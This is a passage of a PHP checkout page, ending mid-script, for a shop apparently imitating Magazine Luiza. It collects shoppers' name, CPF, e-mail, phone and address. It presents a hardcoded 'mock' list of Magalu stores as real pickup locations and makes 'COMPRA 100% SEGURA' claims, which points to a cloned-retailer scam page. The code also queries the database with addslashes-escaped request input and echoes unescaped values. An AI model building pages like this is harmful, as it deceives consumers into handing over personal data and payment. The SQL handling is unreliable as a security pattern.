<?php 
session_start();
require_once("api/db.php");
require_once("api/facebook_pixel.php");

if (!isset($_GET["produto"])) {
    header("Location: ./index");
    exit();
}

$id = addslashes($_GET["produto"]);
$sqlx = mysqli_query($conn, "SELECT * FROM produto WHERE codigo='$id'");
$row_prod = $sqlx ? mysqli_fetch_assoc($sqlx) : null;
if (!$row_prod) {
    header("Location: ./index");
    exit();
}

$codigo = $row_prod["codigo"];
$nomeproduto = $row_prod["nome"];
$img = $row_prod["img"];
$valor = $row_prod["valor"];
$valor_num = (float)str_replace(',', '.', str_replace('.', '', (string)$valor));

// Disparar Checkout no Pixel
echo fb_pixel_event_script('InitiateCheckout', [
    'content_ids' => [$codigo],
    'content_name' => $nomeproduto,
    'content_type' => 'product',
    'value' => $valor_num,
    'currency' => 'BRL'
]);

$sql_conf = mysqli_query($conn, "SELECT * FROM config LIMIT 1");
$row_conf = $sql_conf ? mysqli_fetch_assoc($sql_conf) : null;
$nome_loja = $row_conf['nome'] ?? 'Minha Loja';
$cor = $row_conf['cor'] ?? '#0086ff';
$img_src = (strpos((string)$img, 'http') === 0) ? $img : "./arquivos/produtos/$codigo/$img";

$logo_files = glob("arquivos/logo/*.png");
$logo_loja = !empty($logo_files) ? $logo_files[0] : "";
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Checkout - <?php echo htmlspecialchars($nome_loja); ?></title>
    
    <!-- Dependências -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    
    <!-- Tailwind CSS para processar as classes do código original -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#0086ff',
                        'primary-foreground': '#ffffff',
                        muted: '#f3f4f6',
                        'muted-foreground': '#6b7280',
                        input: '#e5e7eb',
                        border: '#e5e7eb'
                    }
                }
            }
        }
    </script>
    
    <style>
        body { background-color: #f9fafb; -webkit-font-smoothing: antialiased; }
        /* Corrige o input outline focus default do tailwind nas bordas */
        input:focus { outline: none !important; }
        
        .frete-btn.active {
            border-color: #0086ff;
            background-color: #f0f7ff;
        }
        .frete-btn.active .radio-circle {
            border-color: #0086ff;
            background-color: #0086ff;
            box-shadow: inset 0 0 0 4px #fff;
        }
    </style>
</head>
<body class="bg-gray-50">
    <!-- Header Original (Logo e Cor da Loja) -->
    <header style="background-color: <?php echo $cor; ?>; padding: 8px 16px; position: sticky; top: 0; z-index: 100; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
      <div style="max-width: 1200px; margin: 0 auto;">
        <div style="display: flex; align-items: center; justify-content: center; padding: 12px 0;">
          <?php if(!empty($logo_loja)): ?>
            <img src="<?php echo $logo_loja; ?>" alt="<?php echo $nome_loja; ?>" style="max-height: 40px; object-fit: contain;">
          <?php else: ?>
            <span style="font-weight: bold; font-size: 18px; color: #fff;"><?php echo $nome_loja; ?></span>
          <?php endif; ?>
        </div>
      </div>
    </header>

    <div class="max-w-2xl mx-auto p-4 space-y-4">
        <div class="space-y-2">
            <!-- Banner da Loja / Promoção -->
            <section aria-label="Destaques do checkout" class="w-full">
                <!-- Banner de espaço reservado. Caso o usuário troque na config, pode usar aqui -->
                <img alt="Banner Destaque" class="w-full h-auto rounded-lg bg-gray-200 object-cover" style="min-height: 80px;" loading="eager" decoding="async" fetchpriority="high" src="/assets/banner-payday-new.png" onerror="this.src='https://via.placeholder.com/800x200/e5e7eb/a1a1aa?text=Banner+Promocional';">
            </section>
            
            <div class="flex items-center">
                <a href="javascript:history.back()" aria-label="Voltar" class="flex items-center gap-1 text-primary text-sm font-semibold">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-left h-4 w-4" aria-hidden="true"><path d="m12 19-7-7 7-7"></path><path d="M19 12H5"></path></svg> 
                    Voltar
                </a>
            </div>
            
            <!-- Início do Formulário Principal -->
            <form id="checkoutForm" onsubmit="proceed(); return false;">
                
                <section class="bg-white border rounded-lg p-4 space-y-3 mb-4">
                    <div class="flex gap-3">
                        <div class="w-20 h-20 shrink-0 border rounded-md overflow-hidden flex items-center justify-center bg-white p-1">
                            <img alt="<?php echo htmlspecialchars($nomeproduto); ?>" class="max-w-full max-h-full object-contain" src="<?php echo $img_src; ?>">
                        </div>
                        <div class="flex-1 min-w-0">
                            <div class="flex items-start justify-between gap-2">
                                <p class="text-sm font-semibold line-clamp-2 flex-1"><?php echo htmlspecialchars($nomeproduto); ?></p>
                            </div>
                            <div class="flex items-center justify-between mt-2">
                                <div class="flex items-center border rounded-md">
                                    <button type="button" class="w-7 h-7 flex items-center justify-center text-primary" onclick="updateQty(-1)">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-minus h-3.5 w-3.5" aria-hidden="true"><path d="M5 12h14"></path></svg>
                                    </button>
                                    <input type="text" id="cart-qty" class="w-7 text-center text-sm font-semibold bg-transparent border-none p-0 focus:ring-0" value="1" readonly>
                                    <button type="button" class="w-7 h-7 flex items-center justify-center text-primary" onclick="updateQty(1)">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-plus h-3.5 w-3.5" aria-hidden="true"><path d="M5 12h14"></path><path d="M12 5v14"></path></svg>
                                    </button>
                                </div>
                                <span class="text-sm font-bold">R$ <?php echo number_format($valor_num, 2, ',', '.'); ?></span>
                            </div>
                        </div>
                    </div>
                    <div class="flex justify-between pt-3 border-t text-sm">
                        <span class="font-semibold">Total dos produtos</span>
                        <span class="font-bold" id="labelTotalProdutos">R$ <?php echo number_format($valor_num, 2, ',', '.'); ?></span>
                    </div>
                </section>
                
                <section class="bg-white border rounded-lg p-4 mb-4">
                    <h2 class="font-bold mb-3 text-base">Identificação</h2>
                    
                    <label class="block text-sm mb-3 last:mb-0">
                        <span class="block text-xs font-semibold mb-1 text-muted-foreground">Nome completo</span>
                        <div class="relative">
                            <input id="nome" placeholder="Como no documento" required class="w-full border rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 border-input focus:ring-primary" type="text" value="">
                        </div>
                    </label>
                    
                    <label class="block text-sm mb-3 last:mb-0">
                        <span class="block text-xs font-semibold mb-1 text-muted-foreground">CPF</span>
                        <div class="relative">
                            <input id="cpf" placeholder="000.000.000-00" required inputmode="numeric" class="w-full border rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 border-input focus:ring-primary" type="text" value="">
                        </div>
                    </label>
                    
                    <label class="block text-sm mb-3 last:mb-0">
                        <span class="block text-xs font-semibold mb-1 text-muted-foreground">E-mail</span>
                        <div class="relative">
                            <input id="email" placeholder="voce@email.com" required class="w-full border rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 border-input focus:ring-primary" type="email" value="">
                        </div>
                    </label>
                    
                    <label class="block text-sm mb-3 last:mb-0">
                        <span class="block text-xs font-semibold mb-1 text-muted-foreground">Telefone</span>
                        <div class="relative">
                            <input id="telefone" placeholder="(11) 99999-9999" required inputmode="numeric" class="w-full border rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 border-input focus:ring-primary" type="text" value="">
                        </div>
                    </label>
                </section>
                
                <section class="bg-white border rounded-lg p-4 mb-4">
                    <h2 class="font-bold mb-3 text-base">Endereço de entrega</h2>
                    <label class="block text-sm mb-3 last:mb-0">
                        <span class="block text-xs font-semibold mb-1 text-muted-foreground">CEP</span>
                        <div class="relative">
                            <input id="cep" placeholder="00000-000" required inputmode="numeric" class="w-full border rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 border-input focus:ring-primary" type="text" value="">
                        </div>
                    </label>
                    
                    <div id="endereco-extra" class="hidden grid grid-cols-1 gap-3 mt-3">
                        <label class="block text-sm">
                            <span class="block text-xs font-semibold mb-1 text-muted-foreground">Rua</span>
                            <div class="relative">
                                <input id="rua" required class="w-full border rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 border-input focus:ring-primary" type="text">
                            </div>
                        </label>
                        <div class="grid grid-cols-2 gap-3">
                            <label class="block text-sm">
                                <span class="block text-xs font-semibold mb-1 text-muted-foreground">Número</span>
                                <div class="relative">
                                    <input id="numero" required class="w-full border rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 border-input focus:ring-primary" type="text">
                                </div>
                            </label>
                            <label class="block text-sm">
                                <span class="block text-xs font-semibold mb-1 text-muted-foreground">Complemento</span>
                                <div class="relative">
                                    <input id="complemento" class="w-full border rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 border-input focus:ring-primary" type="text">
                                </div>
                            </label>
                        </div>
                        <label class="block text-sm">
                            <span class="block text-xs font-semibold mb-1 text-muted-foreground">Bairro</span>
                            <div class="relative">
                                <input id="bairro" required class="w-full border rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 border-input focus:ring-primary" type="text">
                            </div>
                        </label>
                        <div class="grid grid-cols-[1fr_80px] gap-3">
                            <label class="block text-sm">
                                <span class="block text-xs font-semibold mb-1 text-muted-foreground">Cidade</span>
                                <div class="relative">
                                    <input id="cidade" required class="w-full border rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 border-input focus:ring-primary" type="text">
                                </div>
                            </label>
                            <label class="block text-sm">
                                <span class="block text-xs font-semibold mb-1 text-muted-foreground">UF</span>
                                <div class="relative">
                                    <input id="estado" required class="w-full border rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 border-input focus:ring-primary" type="text">
                                </div>
                            </label>
                        </div>
                    </div>
                </section>

                <!-- Forma de Entrega Oculta inicialmente -->
                <section id="forma-entrega-section" class="bg-white border rounded-lg p-4 mb-4 hidden mt-4">
                    <h2 class="font-bold mb-3">Forma de entrega</h2>
                    <input type="hidden" id="tipo-frete" value="padrao">
                    
                    <button type="button" onclick="selectFrete('padrao', 0, this)" class="frete-btn active w-full flex items-start gap-3 border rounded-lg p-3 text-left mb-2 transition border-border" data-valor="0">
                        <div class="radio-circle mt-0.5 h-5 w-5 rounded-full border-2 shrink-0 flex items-center justify-center border-muted-foreground"></div>
                        <div class="flex-1 min-w-0">
                            <div class="flex items-center justify-between gap-2">
                                <span class="font-bold text-sm flex items-center gap-2">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-truck h-5 w-5 text-primary" aria-hidden="true"><path d="M14 18V6a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2v11a1 1 0 0 0 1 1h2"></path><path d="M15 18H9"></path><path d="M19 18h2a1 1 0 0 0 1-1v-3.65a1 1 0 0 0-.22-.624l-3.48-4.35A1 1 0 0 0 17.52 8H14"></path><circle cx="17" cy="18" r="2"></circle><circle cx="7" cy="18" r="2"></circle></svg>
                                    Entrega padrão
                                </span>
                                <span class="text-[#6FBE44] text-sm">Frete grátis</span>
                            </div>
                            <p class="text-xs text-muted-foreground mt-0.5">5 a 7 dias úteis · Após pagamento confirmado</p>
                        </div>
                    </button>
                    
                    <button type="button" onclick="selectFrete('expressa', 19.90, this)" class="frete-btn w-full flex items-start gap-3 border rounded-lg p-3 text-left mb-2 transition border-border" data-valor="19.90">
                        <div class="radio-circle mt-0.5 h-5 w-5 rounded-full border-2 shrink-0 flex items-center justify-center border-muted-foreground"></div>
                        <div class="flex-1 min-w-0">
                            <div class="flex items-center justify-between gap-2">
                                <span class="font-bold text-sm flex items-center gap-2">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-truck h-5 w-5 text-primary" aria-hidden="true"><path d="M14 18V6a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2v11a1 1 0 0 0 1 1h2"></path><path d="M15 18H9"></path><path d="M19 18h2a1 1 0 0 0 1-1v-3.65a1 1 0 0 0-.22-.624l-3.48-4.35A1 1 0 0 0 17.52 8H14"></path><circle cx="17" cy="18" r="2"></circle><circle cx="7" cy="18" r="2"></circle></svg>
                                    Entrega expressa
                                </span>
                                <span class="font-bold">R$ 19,90</span>
                            </div>
                            <p class="text-xs text-muted-foreground mt-0.5">1 a 3 dias úteis · Após pagamento confirmado</p>
                        </div>
                    </button>
                    
                    <button type="button" onclick="selectFrete('loja', 0, this)" class="frete-btn w-full flex items-start gap-3 border rounded-lg p-3 text-left transition border-border" data-valor="0">
                        <div class="radio-circle mt-0.5 h-5 w-5 rounded-full border-2 shrink-0 flex items-center justify-center border-muted-foreground"></div>
                        <div class="flex-1 min-w-0">
                            <div class="flex items-center justify-between gap-2">
                                <span class="font-bold text-sm flex items-center gap-2">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-map-pin h-5 w-5 text-primary" aria-hidden="true"><path d="M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0"></path><circle cx="12" cy="10" r="3"></circle></svg>
                                    Retirada em loja
                                </span>
                                <span class="text-[#6FBE44] text-sm">Grátis</span>
                            </div>
                            <p class="text-xs text-muted-foreground mt-0.5">Escolha a loja mais próxima</p>
                        </div>
                    </button>

                    <!-- Lista Mockup de Lojas Magalu da Cidade -->
                    <div id="mapa-loja-container" style="display: none;" class="mt-3 bg-blue-50 border border-[#0086ff] rounded-lg p-3">
                        <p class="text-xs font-semibold text-[#0086ff] mb-2 flex items-center gap-1">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-map-pin"><path d="M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0"></path><circle cx="12" cy="10" r="3"></circle></svg>
                            Lojas disponíveis para retirada:
                        </p>
                        <div id="lista-lojas">
                            <!-- Injetado por JS -->
                        </div>
                    </div>
                </section>
                
                <section class="bg-white border rounded-lg p-4 text-sm mb-4">
                    <div class="flex justify-between mb-1">
                        <span>Subtotal</span>
                        <span id="summarySubtotal">R$ <?php echo number_format($valor_num, 2, ',', '.'); ?></span>
                    </div>
                    <div class="flex justify-between mb-1">
                        <span>Frete</span>
                        <span id="summaryFrete" class="text-muted-foreground">—</span>
                    </div>
                    <div class="flex justify-between font-bold text-base pt-2 border-t mt-2">
                        <span>Total</span>
                        <span id="summaryTotal">R$ <?php echo number_format($valor_num, 2, ',', '.'); ?></span>
                    </div>
                </section>
                
                <button type="submit" id="btnSubmit" class="w-full bg-primary text-primary-foreground font-bold py-3.5 rounded-lg hover:bg-blue-600 transition-colors">
                    Continuar
                </button>
            </form>
            
            <section class="rounded-lg border border-[#E5E7EB] bg-white px-3 py-3 text-center mt-4">
                <div class="flex items-center justify-center gap-1.5">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-lock h-4 w-4 text-[#1BA200]" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                    <span class="text-[13px] font-bold tracking-wide text-[#111827]">COMPRA 100% SEGURA</span>
                </div>
                <p class="mt-2 text-[10px] font-medium text-[#6B7280]">Formas de pagamento aceitas:</p>
                <div class="mt-2 flex items-center justify-center divide-x divide-[#E5E7EB]">
                    <div class="flex h-8 items-center justify-center px-3">
                        <span class="flex items-center gap-1.5"><svg viewBox="0 0 32 32" class="h-5 w-5" aria-hidden="true"><defs><clipPath id="pix-diamond-clip"><rect transform="rotate(45 16 16)" x="6" y="6" width="20" height="20" rx="5"></rect></clipPath></defs><g clip-path="url(#pix-diamond-clip)"><rect transform="rotate(45 16 16)" x="6" y="6" width="20" height="20" rx="5" fill="#00B8A9"></rect><path d="M0,20.5 C8,20.5 8,16 16,16 C24,16 24,11.5 32,11.5" stroke="#fff" stroke-width="2.3" fill="none"></path><path d="M0,11.5 C8,11.5 8,16 16,16 C24,16 24,20.5 32,20.5" stroke="#fff" stroke-width="2.3" fill="none"></path></g></svg><span class="text-[15px] font-semibold lowercase tracking-tight text-[#8C9196]">pix</span></span>
                    </div>
                    <div class="flex h-8 items-center justify-center px-3">
                        <span class="text-[17px] font-bold italic tracking-tight text-[#1A1F71]">VISA</span>
                    </div>
                    <div class="flex h-8 items-center justify-center px-3">
                        <span class="flex flex-col items-center leading-none"><svg viewBox="0 0 40 24" class="h-5 w-8" aria-hidden="true"><circle cx="15" cy="12" r="10" fill="#EB001B"></circle><circle cx="25" cy="12" r="10" fill="#F79E1B" fill-opacity="0.9"></circle><path fill="#FF5F00" d="M20 4.6a10 10 0 0 0 0 14.8 10 10 0 0 0 0-14.8Z"></path></svg><span class="mt-[1px] text-[6px] font-semibold tracking-wide text-[#231F20]">mastercard</span></span>
                    </div>
                    <div class="flex h-8 items-center justify-center px-3">
                        <span class="flex items-center gap-1"><svg viewBox="0 0 24 24" class="h-5 w-5" aria-hidden="true"><circle cx="12" cy="12" r="10" fill="#000"></circle><path d="M12 6.5a5.5 5.5 0 0 0-5.2 3.7l2.6.9A2.75 2.75 0 0 1 12 9.2V6.5Z" fill="#FFCB05"></path><path d="M6.8 13.8A5.5 5.5 0 0 0 12 17.5v-2.7a2.75 2.75 0 0 1-2.6-1.9l-2.6.9Z" fill="#00A4E0"></path><path d="M12 17.5a5.5 5.5 0 0 0 5.3-4l-2.7-.7A2.75 2.75 0 0 1 12 14.8v2.7Z" fill="#EF4123"></path></svg><span class="text-[15px] font-bold tracking-tight text-[#231F20]">elo</span></span>
                    </div>
                    <div class="flex h-8 items-center justify-center px-3">
                        <span class="flex items-center gap-1"><svg viewBox="0 0 24 24" class="h-[18px] w-[18px]" aria-hidden="true"><path fill="#4285F4" d="M23.5 12.3c0-.8-.1-1.6-.2-2.3H12v4.5h6.5a5.6 5.6 0 0 1-2.4 3.7v3h3.9c2.3-2.1 3.5-5.2 3.5-8.9Z"></path><path fill="#34A853" d="M12 24c3.2 0 5.9-1.1 7.9-2.9l-3.9-3c-1.1.7-2.4 1.2-4 1.2-3.1 0-5.7-2.1-6.6-4.9H1.4v3.1A12 12 0 0 0 12 24Z"></path><path fill="#FBBC05" d="M5.4 14.4a7.2 7.2 0 0 1 0-4.6V6.7H1.4a12 12 0 0 0 0 10.8l4-3.1Z"></path><path fill="#EA4335" d="M12 4.8c1.8 0 3.3.6 4.6 1.8l3.4-3.4C17.9 1.2 15.2 0 12 0A12 12 0 0 0 1.4 6.7l4 3.1C6.3 6.9 8.9 4.8 12 4.8Z"></path></svg><span class="text-[15px] font-medium tracking-tight text-[#5F6368]">Pay</span></span>
                    </div>
                </div>
                <div class="mt-2 flex items-center justify-center gap-1.5">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shield-check h-3.5 w-3.5 text-[#1BA200]" aria-hidden="true"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path><path d="m9 12 2 2 4-4"></path></svg>
                    <span class="text-[10px] text-[#6B7280]">Seus dados são protegidos com criptografia <span class="font-bold text-[#1BA200]">SSL</span>.</span>
                </div>
            </section>
        </div>
    </div>

    <!-- Scripts da Lógica Original do Checkout -->
    <script>
        const valorUnitario = <?php echo (float)$valor_num; ?>;
        const codigoProduto = "<?php echo $codigo; ?>";
        let valorFrete = 0;

        function formatarMoeda(valor) {
            return valor.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
        }

        function recalcTotals() {
            let qty = parseInt($('#cart-qty').val());
            if (isNaN(qty) || qty < 1) qty = 1;
            
            const subtotal = qty * valorUnitario;
            const subtotalFmt = 'R$ ' + formatarMoeda(subtotal);
            const total = subtotal + valorFrete;
            const totalFmt = 'R$ ' + formatarMoeda(total);
            
            $('#labelTotalProdutos').text(subtotalFmt);
            $('#summarySubtotal').text(subtotalFmt);
            $('#summaryTotal').text(totalFmt);
            
            if (valorFrete > 0) {
                $('#summaryFrete').text('R$ ' + formatarMoeda(valorFrete)).removeClass('text-muted-foreground').addClass('font-bold');
            } else {
                $('#summaryFrete').text('Grátis').removeClass('font-bold').addClass('text-[#6FBE44]');
            }

            localStorage.setItem('lojavirtual', JSON.stringify({
                quantos: qty,
                precoFinal: formatarMoeda(total)
            }));
        }

        function updateQty(change) {
            let qty = parseInt($('#cart-qty').val()) + change;
            if (qty < 1) qty = 1;
            $('#cart-qty').val(qty);
            recalcTotals();
        }


        const lojasMock = [
            { nome: 'Magazine Luiza - Paulista (SP)', end: 'Av. Paulista, 1000', lat: -23.56168, lng: -46.65598, tempo: '2 horas', uf: 'SP' },
            { nome: 'Magazine Luiza - Centro (SP)', end: 'Rua Direita, 200', lat: -23.5489, lng: -46.6388, tempo: '2 horas', uf: 'SP' },
            { nome: 'Magazine Luiza - Tatuapé (SP)', end: 'Rua Tuiuti, 2000', lat: -23.5406, lng: -46.5768, tempo: '2 horas', uf: 'SP' },
            { nome: 'Magazine Luiza - Interlagos (SP)', end: 'Av. Interlagos, 2255', lat: -23.6766, lng: -46.6744, tempo: '4 horas', uf: 'SP' },
            { nome: 'Magazine Luiza - Campinas (SP)', end: 'R. Barão de Jaguara, 1000', lat: -22.9056, lng: -47.0608, tempo: '1 dia', uf: 'SP' },
            
            { nome: 'Magazine Luiza - Centro (RJ)', end: 'Av. Rio Branco, 100', lat: -22.9068, lng: -43.1729, tempo: '2 horas', uf: 'RJ' },
            { nome: 'Magazine Luiza - Copacabana (RJ)', end: 'Av. N. Sra. de Copacabana, 500', lat: -22.9711, lng: -43.1825, tempo: '2 horas', uf: 'RJ' },
            
            { nome: 'Magazine Luiza - Centro (MG)', end: 'Av. Afonso Pena, 1000', lat: -19.9167, lng: -43.9345, tempo: '1 dia', uf: 'MG' },
            
            { nome: 'Magazine Luiza - Centro (MS)', end: 'R. 14 de Julho, 2100, Campo Grande', lat: -20.4697, lng: -54.6201, tempo: '2 horas', uf: 'MS' },
            { nome: 'Magazine Luiza - Norte Sul (MS)', end: 'Av. Pres. Ernesto Geisel, Campo Grande', lat: -20.4900, lng: -54.6150, tempo: '2 horas', uf: 'MS' },
            { nome: 'Magazine Luiza - Dourados (MS)', end: 'Av. Marcelino Pires, 1500', lat: -22.2236, lng: -54.8122, tempo: '4 horas', uf: 'MS' },
            
            { nome: 'Magazine Luiza - Centro (PR)', end: 'Rua XV de Novembro, 500, Curitiba', lat: -25.4284, lng: -49.2733, tempo: '2 horas', uf: 'PR' },
            { nome: 'Magazine Luiza - Palladium (PR)', end: 'Av. Pres. Kennedy, 4121, Curitiba', lat: -25.4740, lng: -49.2900, tempo: '4 horas', uf: 'PR' },
            
            { nome: 'Magazine Luiza - Iguatemi (BA)', end: 'Av. Tancredo Neves, Salvador', lat: -12.9714, lng: -38.5114, tempo: '2 horas', uf: 'BA' },
            { nome: 'Magazine Luiza - Centro (CE)', end: 'Rua do Rosário, Fortaleza', lat: -3.71722, lng: -38.5434, tempo: '2 dias', uf: 'CE' },
            { nome: 'Magazine Luiza - Centro (AM)', end: 'Av. Eduardo Ribeiro, Manaus', lat: -3.1190, lng: -60.0217, tempo: '3 dias', uf: 'AM' },
            { nome: 'Magazine Luiza - Plano Piloto (DF)', end: 'W3 Sul, Brasília', lat: -15.7942, lng: -47.8822, tempo: '1 dia', uf: 'DF' }
        ];

        // Fórmula de Haversine para calcular distância em KM entre duas coordenadas
        function getDistanceFromLatLonInKm(lat1, lon1, lat2, lon2) {
            const R = 6371; // Raio da terra em km
            const dLat = (lat2 - lat1) * (Math.PI/180);
            const dLon = (lon2 - lon1) * (Math.PI/180);
            const a = 
                Math.sin(dLat/2) * Math.sin(dLat/2) +
                Math.cos(lat1 * (Math.PI/180)) * Math.cos(lat2 * (Math.PI/180)) * 
                Math.sin(dLon/2) * Math.sin(dLon/2); 
            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a)); 
            const d = R * c; 
            return d;
        }

        // Variáveis globais para armazenar a localização do usuário
        let userLat = null;
        let userLng = null;

        function getLojas(userLat, userLng) {
            // Fallback: se não temos latitude/longitude (falha na API), vamos buscar pelo UF preenchido no input
            if (!userLat || !userLng) {
                const ufAtual = $('#estado').val() || 'SP';
                let lojasEstado = lojasMock.filter(loja => loja.uf === ufAtual);
                
                if (lojasEstado.length === 0) {
                    lojasEstado = [lojasMock[0], lojasMock[1]]; // Padrão SP
                }
                
                return { 
                    lojas: lojasEstado.slice(0, 4), 
                    mensagem: `Sua localização exata não foi encontrada, mas exibimos opções para o estado ${ufAtual}:`
                };
            }

            // Mapeia o array adicionando a distância
            let lojasComDistancia = lojasMock.map(loja => {
                let dist = getDistanceFromLatLonInKm(userLat, userLng, loja.lat, loja.lng);
                return { ...loja, distancia: dist };
            });

            // Ordena da mais próxima para a mais distante
            lojasComDistancia.sort((a, b) => a.distancia - b.distancia);

            // Pega as 4 lojas mais próximas
            let maisProximas = lojasComDistancia.slice(0, 4);
            let lojaMaisProxima = maisProximas[0];
            
            let mensagem = "";
            if (lojaMaisProxima.distancia > 50) {
                mensagem = `Não há lojas muito próximas. A unidade mais perto fica a ${Math.round(lojaMaisProxima.distancia)} km de distância. Veja as opções:`;
            } else {
                mensagem = `Encontramos diversas opções a partir de ${Math.round(lojaMaisProxima.distancia)} km de você:`;
            }

            // Formata a distância para exibição no HTML
            maisProximas = maisProximas.map(loja => {
                return {
                    ...loja,
                    distanciaDisplay: loja.distancia < 1 ? '< 1 km' : Math.round(loja.distancia) + ' km'
                };
            });

            return { lojas: maisProximas, mensagem: mensagem };
        }

        function selectFrete(tipo, valor, elem) {
            $('#tipo-frete').val(tipo);
            valorFrete = valor;
            
            $('.frete-btn').removeClass('active');
            $('.frete-btn .radio-circle').css({
                'border-color': '',
                'background-color': '',
                'box-shadow': ''
            });

            if (elem) {
                $(elem).addClass('active');
            } else {
                $(`.frete-btn[data-valor="${valor}"]`).first().addClass('active');
            }
            
            recalcTotals();

            if (tipo === 'loja') {
                const cidade = $('#cidade').val();
                const uf = $('#estado').val();
                
                if (!cidade || !uf) {
                    $('#lista-lojas').html(`<p class="text-sm text-red-500 p-2">Por favor, preencha o CEP primeiro para buscarmos as lojas.</p>`);
                    $('#mapa-loja-container').slideDown();
                    return;
                }

                const result = getLojas(userLat, userLng);
                let html = '';
                
                if (result.mensagem) {
                    html += `<p class="text-xs text-orange-600 mb-3 font-medium bg-orange-50 p-2 rounded border border-orange-200">📍 ${result.mensagem}</p>`;
                }

                result.lojas.forEach((loja, index) => {
                    html += `
                        <label class="flex items-start gap-3 p-3 bg-white border rounded-lg cursor-pointer mt-2 hover:border-[#0086ff] transition">
                            <input type="radio" name="loja_escolhida" value="${loja.nome}" ${index === 0 ? 'checked' : ''} class="mt-1 text-[#0086ff] focus:ring-[#0086ff]">
                            <div class="flex-1">
                                <div class="flex justify-between items-center">
                                    <p class="text-sm font-bold text-gray-800">${loja.nome}</p>
                                    <span class="text-xs font-bold text-[#0086ff] bg-blue-50 px-2 py-0.5 rounded">${loja.distanciaDisplay || ''}</span>
                                </div>
                                <p class="text-xs text-gray-500 mt-0.5">${loja.end}</p>
                                <p class="text-[11px] text-gray-400 mt-0.5">Disponível em ${loja.tempo}</p>
                                <p class="text-[10px] text-green-600 font-semibold mt-1">✓ Sem taxa de retirada</p>
                            </div>
                        </label>
                    `;
                });
                
                $('#lista-lojas').html(html);
                $('#mapa-loja-container').slideDown();
            } else {
                $('#mapa-loja-container').slideUp();
            }
        }

        $(document).ready(function(){
            localStorage.setItem('lojavirtual', JSON.stringify({
                quantos: 1,
                precoFinal: formatarMoeda(valorUnitario)
            }));

            $('#cpf').mask('000.000.000-00', {reverse: true});
            $('#cep').mask('00000-000');
            var SPMaskBehavior = function (val) {
              return val.replace(/\D/g, '').length === 11 ? '(00) 00000-0000' : '(00) 0000-00009';
            },
            spOptions = {
              onKeyPress: function(val, e, field, options) {
                  field.mask(SPMaskBehavior.apply({}, arguments), options);
                }
            };
            $('#telefone').mask(SPMaskBehavior, spOptions);

            $('#cep').on('blur', function(){
                const cep = $(this).val().replace(/\D/g, '');
                if(cep.length === 8) {
                    // Usando BrasilAPI para pegar Latitude e Longitude além do endereço
                    $.getJSON('https://brasilapi.com.br/api/cep/v2/' + cep, function(json){
                        // A BrasilAPI não retorna uma flag erro: true igual ao ViaCEP, ela retorna erro 404, 
                        // mas se caiu no sucesso do getJSON, deu certo.
                        if(json.city) {
                            $('#rua').val(json.street || '');
                            $('#bairro').val(json.neighborhood || '');
                            $('#cidade').val(json.city || '');
